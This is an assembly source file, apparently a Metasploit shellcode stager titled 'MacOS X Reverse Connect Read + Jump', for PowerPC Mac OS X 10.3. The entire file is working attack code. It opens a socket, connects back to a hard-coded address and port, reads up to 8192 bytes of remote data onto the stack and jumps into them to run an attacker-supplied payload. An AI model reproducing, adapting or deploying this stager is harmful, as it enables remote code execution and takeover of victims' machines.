;      Title:  MacOS X Reverse Connect Read + Jump
;  Platforms:  MacOS X (Tested 10.3.3 | 10.3.4)
;     Author:  hdm[at]metasploit.com


.globl _main
.text
_main:
	;; socket
	li      r3, 2
        li      r4, 1
        li      r5, 6
        li      r0, 97
        sc
        xor     r0, r0, r0
        mr      r30, r3

        bl konnect
        .long 0x00022211
        .long 0x7f000001

konnect:
        mflr    r4
        li      r5, 0x10
        li      r0, 98
        mr      r3, r30
        sc
        xor     r0, r0, r0
        li      r5, 2
		
reader:
	li	r0, 3
	mr	r3, r30
	subi	r4, r1, 8192
	li	r5, 8192
	mtlr	r4
	sc
	xor	r5, r5, r5
	blr
